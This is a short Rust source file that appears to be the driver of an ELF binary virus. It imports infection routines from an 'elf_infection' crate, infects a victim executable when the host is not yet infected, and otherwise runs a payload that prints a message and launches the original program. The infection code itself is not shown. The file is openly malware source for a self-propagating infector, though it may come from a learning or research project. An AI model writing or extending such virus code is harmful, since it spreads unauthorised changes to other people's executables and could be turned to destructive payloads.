use elf_infection::infect::{
    infect_victim,
    is_already_infected,
    spawn_infected_program,
};

fn main() {
    match is_already_infected() {
        false => infect_victim(),
        true => payload(),
    }
}

fn fun_stuff() {
    println!("This program has been infected.");
}

fn payload() {
    fun_stuff();
    let _ = spawn_infected_program();
}



